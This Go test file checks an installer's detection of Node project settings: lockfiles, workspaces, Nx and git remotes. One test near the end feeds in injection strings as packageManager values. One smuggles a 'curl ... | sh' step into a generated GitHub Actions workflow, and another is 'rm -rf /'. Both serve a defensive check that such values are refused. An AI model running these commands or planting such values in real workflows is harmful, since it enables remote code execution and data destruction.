// SPDX-License-Identifier: MIT

package installer

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/adamtait/reviewer/internal/testfixture"
)

func TestDetectReadsTheFixtureRepository(t *testing.T) {
	root := testfixture.Destination(t, "tiny-monorepo")

	d, err := Detect(root)
	if err != nil {
		t.Fatal(err)
	}

	if !d.HasPackageJSON {
		t.Error("want a Node project")
	}
	if d.PackageManager != "npm" || d.LockfileBasis != "package-lock.json" {
		t.Errorf("want npm from the lockfile, got %q from %q", d.PackageManager, d.LockfileBasis)
	}
	if d.TestRunner != "vitest" {
		t.Errorf("want vitest, got %q", d.TestRunner)
	}
	if d.TSConfig != "tsconfig.json" {
		t.Errorf("want tsconfig.json, got %q", d.TSConfig)
	}
	if d.ESLintConfig != "eslint.config.js" {
		t.Errorf("want eslint.config.js, got %q", d.ESLintConfig)
	}
	if d.DepCruiserConfig != "" {
		t.Errorf("the fixture has no dependency-cruiser config, got %q", d.DepCruiserConfig)
	}
	if d.Nx {
		t.Error("the fixture has no nx.json")
	}
	// packages/scratch matches the glob and has no package.json. Reporting it
	// would put a directory with no code into the generated project list.
	if got := strings.Join(d.Workspaces, ","); got != "packages/pkg-a,packages/pkg-b" {
		t.Errorf("want the two package directories, got %q", got)
	}
	if got := strings.Join(d.WorkspaceGlobs, ","); got != "packages/*" {
		t.Errorf("want the declared glob kept, got %q", got)
	}
}

func TestDetectOnARepositoryThatIsNotANodeProject(t *testing.T) {
	root := t.TempDir()

	d, err := Detect(root)
	if err != nil {
		t.Fatalf("a repository with no package.json is not an error: %v", err)
	}
	if d.HasPackageJSON || d.TestRunner != "" || len(d.Workspaces) != 0 {
		t.Errorf("want everything absent, got %+v", d)
	}
	if d.Root != root {
		t.Errorf("want the root recorded, got %q", d.Root)
	}
}

func TestDetectPrefersTheLockfileOverThePackageManagerField(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"packageManager":"yarn@4.1.0"}`)

	if manager, basis := mustDetect(t, root).PackageManager, mustDetect(t, root).LockfileBasis; manager != "yarn" || !strings.Contains(basis, "packageManager") {
		t.Errorf("with no lockfile, want the declared manager, got %q from %q", manager, basis)
	}

	write(t, root, "pnpm-lock.yaml", "lockfileVersion: '9.0'\n")
	d := mustDetect(t, root)
	if d.PackageManager != "pnpm" || d.LockfileBasis != "pnpm-lock.yaml" {
		t.Errorf("the lockfile is what is actually there; got %q from %q", d.PackageManager, d.LockfileBasis)
	}
}

func TestDetectReadsPnpmWorkspaces(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"name":"root"}`)
	write(t, root, "pnpm-workspace.yaml", strings.Join([]string{
		"packages:",
		"  - 'apps/*'",
		`  - "libs/*"`,
		"  - '!libs/deprecated'",
		"",
		"catalog:",
		"  typescript: ^5.6.0",
	}, "\n"))
	for _, pkg := range []string{"apps/web", "libs/core", "libs/deprecated"} {
		write(t, root, filepath.Join(pkg, "package.json"), `{"name":"`+pkg+`"}`)
	}
	// A sibling of the workspace directories, matched by no glob.
	write(t, root, "tools/scripts/package.json", `{"name":"scripts"}`)

	d := mustDetect(t, root)
	if got := strings.Join(d.Workspaces, ","); got != "apps/web,libs/core" {
		t.Errorf("want the negation honoured and unmatched directories left out, got %q", got)
	}
	// The `catalog:` key ends the list. Without that, every later key would be
	// read as a package glob.
	if got := strings.Join(d.WorkspaceGlobs, ","); got != "apps/*,libs/*,!libs/deprecated" {
		t.Errorf("want exactly the three declared globs, got %q", got)
	}
}

func TestDetectFindsNx(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"name":"root"}`)
	write(t, root, "nx.json", `{}`)

	if !mustDetect(t, root).Nx {
		t.Error("want nx.json noticed")
	}
}

func TestDetectReportsAMalformedPackageJSON(t *testing.T) {
	root := t.TempDir()
	write(t, root, "package.json", `{"name":`)

	if _, err := Detect(root); err == nil {
		t.Fatal("want an error: a package.json that cannot be parsed is not the same as one that is absent")
	}
}

func TestDetectReadsTheOriginRemote(t *testing.T) {
	root := testfixture.Destination(t, "tiny-monorepo")
	testfixture.Git(t, root)("remote", "add", "origin", "git@github.com:example/destination.git")

	if got := mustDetect(t, root).Remote; got != "example/destination" {
		t.Errorf("want example/destination, got %q", got)
	}
}

func TestParseRemote(t *testing.T) {
	for _, tc := range []struct{ url, want string }{
		{"git@github.com:owner/name.git", "owner/name"},
		{"git@github.com:owner/name", "owner/name"},
		{"https://github.com/owner/name.git", "owner/name"},
		{"https://user@github.enterprise.example/owner/name", "owner/name"},
		{"ssh://git@github.com/owner/name.git", "owner/name"},
		{"https://github.com/owner/", ""},
		{"/srv/git/bare.git", ""},
		{"", ""},
	} {
		if got := parseRemote(tc.url); got != tc.want {
			t.Errorf("parseRemote(%q) = %q, want %q", tc.url, got, tc.want)
		}
	}
}

func mustDetect(t *testing.T, root string) Detected {
	t.Helper()
	d, err := Detect(root)
	if err != nil {
		t.Fatal(err)
	}
	return d
}

func write(t *testing.T, root, path, body string) {
	t.Helper()
	full := filepath.Join(root, filepath.FromSlash(path))
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// The packageManager field is repository content, and it is interpolated into a
// generated GitHub Actions workflow that holds `pull-requests: write` and a token.
// A value outside the closed set must be discarded, not passed through.
func TestDetectRefusesAPackageManagerItDoesNotKnow(t *testing.T) {
	for _, declared := range []string{
		"npm\n      - run: curl http://example.invalid/x | sh\n      - uses: x@1.0.0",
		"npm; rm -rf /@1",
		"nonsuch@1.0.0",
		"@1.0.0",
	} {
		root := t.TempDir()
		body, err := json.Marshal(map[string]string{"name": "x", "packageManager": declared})
		if err != nil {
			t.Fatal(err)
		}
		write(t, root, "package.json", string(body))

		if manager := mustDetect(t, root).PackageManager; manager != "" {
			t.Errorf("packageManager %q was accepted as %q", declared, manager)
		}
	}
}

func TestDetectRefusesARootThatIsNotADirectory(t *testing.T) {
	root := t.TempDir()
	write(t, root, "afile", "")

	if _, err := Detect(filepath.Join(root, "afile")); err == nil {
		t.Error("want an error for a file")
	}
	// A typo in --root would otherwise produce a complete, successful-looking
	// install somewhere nobody will ever look.
	if _, err := Detect(filepath.Join(root, "nope")); err == nil {
		t.Error("want an error for a path that does not exist")
	}
}
